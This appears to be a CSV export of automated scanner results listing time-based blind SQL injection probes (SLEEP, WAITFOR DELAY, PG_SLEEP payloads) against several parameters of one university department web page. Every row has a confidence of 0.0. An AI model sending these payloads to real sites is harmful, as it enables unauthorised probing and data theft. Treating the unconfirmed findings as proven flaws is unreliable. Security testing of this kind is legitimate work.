Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=SLEEP%285%29%23#1765968062881-8448b7a7-eaf1),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=SLEEP%285%29%23#1765968062881-8448b7a7-eaf1),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=SLEEP%285%29%23#1765968062881-8448b7a7-eaf1),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1765968062881-8448b7a7-eaf1),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=SLEEP%285%29%23#1765968062881-8448b7a7-eaf1),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=SLEEP%285%29%23#1765968062881-8448b7a7-eaf1),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=SLEEP%285%29%23#1765968062881-8448b7a7-eaf1),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=SLEEP%285%29%23#1765968062881-8448b7a7-eaf1),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%22+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%22+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1766378363869-9633061a-4de9),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1+OR+SLEEP%285%29#1766378363869-9633061a-4de9),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%22+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1+OR+SLEEP%285%29#1766378363869-9633061a-4de9),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1766378363869-9633061a-4de9),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%22+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1+OR+SLEEP%285%29#1766378363869-9633061a-4de9),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1+OR+SLEEP%285%29#1766378363869-9633061a-4de9),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1+OR+SLEEP%285%29#1766378363869-9633061a-4de9),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%22+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%22+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1+OR+SLEEP%285%29#1766378363869-9633061a-4de9),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1766378363869-9633061a-4de9),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27+AND+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%22+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1766378363869-9633061a-4de9),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27+AND+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1766378363869-9633061a-4de9),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1766378363869-9633061a-4de9),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27+AND+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=SLEEP%285%29%23#1766378363869-9633061a-4de9),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27+AND+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=SLEEP%285%29%23#1766378363869-9633061a-4de9),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27+AND+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=SLEEP%285%29%23#1766378363869-9633061a-4de9),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=SLEEP%285%29%23#1766378363869-9633061a-4de9),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%22+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
